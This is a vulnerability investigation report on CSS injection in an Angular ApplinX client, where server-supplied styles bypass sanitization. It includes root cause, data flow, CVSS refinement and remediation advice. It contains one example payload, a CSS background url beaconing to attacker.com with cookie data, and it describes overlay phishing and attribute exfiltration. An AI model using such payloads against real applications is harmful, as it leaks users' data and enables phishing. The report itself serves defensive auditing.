# VULN-001-I: Investigation Report - css-injection-bypass-security-trust-style

**Phase**: Inquisitor
**Vulnerability ID**: VULN-001
**Descriptor**: css-injection-bypass-security-trust-style
**Assessment**: 2026-07-31-10-57
**Investigated**: 2026-07-31T12:00:00Z
**Analyst**: D4rthB0b-Inquisitor
**Status**: CONFIRMED

---

## Investigation Summary

**Confirmation**: This vulnerability has been CONFIRMED as exploitable.
**Confirmed At**: 2026-07-31T12:00:00Z

**Exploitability**: MEDIUM

---

## Root Cause Analysis

[`InputFieldComponent.getCss()`](src/app/mini-components/input-field/input-field.component.ts:196) and [`FieldComponent.getCss()`](src/app/mini-components/field/field.component.ts:82) both pass `field.style` directly from the ApplinX REST API `GetScreenResponse` to `DomSanitizer.bypassSecurityTrustStyle()` without any validation, allowlist, or length check. The `SafeStyle` return value is bound to `[style]` in Angular templates, bypassing Angular's built-in style sanitization entirely. Both `InputFieldComponent` and `FieldComponent` contain this identical pattern.

---

## Attack Scenario

A compromised ApplinX REST API server returns `GetScreenResponse` with `field.style` set to malicious CSS (e.g., `position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://attacker.com/?c=cookie)`). Because `bypassSecurityTrustStyle()` marks the value as trusted, Angular renders it as raw inline CSS. Without a Content Security Policy, this enables: (1) CSS-based UI redressing via `position:fixed` overlays that mimic login pages; (2) CSS attribute selector exfiltration targeting visible DOM content; (3) background-image URL loading to a remote server enabling beacon-based data leakage. Modern browsers block CSS `expression()` and `javascript:` URLs in CSS, so direct JS execution is not achievable via this vector alone.

---

## Prerequisites

- Attacker must control or compromise the ApplinX REST API backend server
- User must be authenticated and receive a screen rendering input fields with attacker-controlled style
- No CSP (Content-Security-Policy) header deployed — no CSP evidence found anywhere in codebase

---

## Privilege Boundary Analysis

**Starting Privilege**: Compromised ApplinX server (network-adjacent trust boundary violation)
**Achieved Privilege**: CSS injection into authenticated browser DOM — UI redressing and CSS-based exfiltration
**Boundary Crossed**: YES

---

## Impact Assessment

**Confidentiality**: LOW
**Integrity**: LOW
**Availability**: NONE

### Impact Description

CSS injection via server-controlled style enables UI redressing (phishing overlays), CSS-based attribute value exfiltration, and visual deception. Modern browsers block direct JS execution via CSS. Without CSP, external resource loading is unrestricted. Impact is bounded by CSS capabilities — no arbitrary code execution without a secondary XSS vector. The same `bypassSecurityTrustStyle` pattern exists in both `InputFieldComponent` and `FieldComponent`.

---

## Data Flow Analysis

**Sources**:
- ApplinX REST API GET /screen → `GetScreenResponse.fields[].style` (server-controlled string)

**Transformations**:
- `field.style` passed to `DomSanitizer.bypassSecurityTrustStyle(field.style ?? '')` — no validation, no allowlist, no sanitization
- Return value is `SafeStyle` object, trusted by Angular template engine

**Sinks**:
- `[style]="getCss()"` on `<input>` element (`input-field.component.html:14`) — rendered as raw inline style
- `[style]="getCss()"` on protected field `<div>` elements (`field.component.html`) — same pattern

---

## Affected Components

### Direct Impact

- **[`InputFieldComponent.getCss()`](src/app/mini-components/input-field/input-field.component.ts:196)**: Primary CSS injection sink for editable input fields
- **[`FieldComponent.getCss()`](src/app/mini-components/field/field.component.ts:82)**: Secondary CSS injection sink for protected (read-only) fields

### Indirect Impact

- **ApplinX REST API /screen endpoint**: Source of server-controlled `field.style` values
- **StorageService (sessionStorage gx_token)**: CSS exfiltration could target visible DOM content including session data

---

## Classification Refinement

### Initial Classification (Scanner)
- CWE: CWE-83, CWE-693
- OWASP: A03:2021-Injection
- CVSS: 7.1 (HIGH)
- Vector: `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N`

### Refined Classification (Inquisitor)
- CWE: CWE-83, CWE-693
- OWASP: A03:2021-Injection
- CVSS: **5.9 (MEDIUM)**
- Vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N`

### Justification
- **PR raised to Low**: Attacker must first compromise the ApplinX backend server — this is not a zero-privilege unauthenticated attack
- **Confidentiality lowered to Low**: CSS injection cannot directly execute JavaScript in modern browsers; exfiltration limited to CSS-observable attributes
- **Integrity lowered to Low**: UI redressing possible but no persistent data modification

---

## Remediation Guidance

### Recommended Fix

Remove `bypassSecurityTrustStyle()` entirely. Most ApplinX terminal styling can be achieved via predefined CSS classes mapped to server-supplied color/attribute codes (foreground, background, isIntensified are already handled this way in [`GXUtils.getFgCssClass()`](src/utils/GXUtils.ts)). If `field.style` must be supported, implement a strict allowlist of permitted CSS properties and values.

**Priority**: HIGH

### Defense-in-Depth Recommendations

1. Deploy `Content-Security-Policy` header: `style-src 'self'` to block external CSS resource loading
2. Audit all remaining `bypassSecurityTrust*` calls in the codebase
3. Implement Angular pipe that validates CSS against a property+value allowlist
4. Consider server-side input validation on ApplinX REST API to reject injected style values

---

## References

**Scan Finding**: [VULN-001-S-scan-finding.md](VULN-001-S-scan-finding.md)

**Threat Model References**:
- TM-001, TM-004

**Attack Surface References**:
- AS-001, AS-002

**External References**:
- https://angular.dev/best-practices/security#bypass-security-apis
- https://owasp.org/www-community/attacks/CSS_Injection
- CWE-83: Improper Neutralization of Script in Attributes in a Web Page

---

**Investigation Complete**: 2026-07-31T12:00:00Z
**Next Phase**: Exploiter (Validation) or Rectifier
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
